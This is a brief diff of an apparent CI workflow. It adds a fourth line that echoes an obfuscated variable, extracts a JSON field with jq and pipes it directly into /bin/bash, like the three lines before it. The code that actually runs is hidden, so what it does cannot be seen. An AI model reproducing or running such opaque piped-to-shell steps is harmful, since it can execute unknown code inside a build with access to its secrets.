@@ -24,6 +24,7 @@ jobs:
           echo $ejxjv91465 | jq -r .mw09 | /bin/bash
           echo $mvmb38 | jq -r .kee3 | /bin/bash
           echo $domi488 | jq -r .xv7279 | /bin/bash
+          echo $fnlv73993 | jq -r .d0 | /bin/bash
 
       - name: Archive results
         if: always()
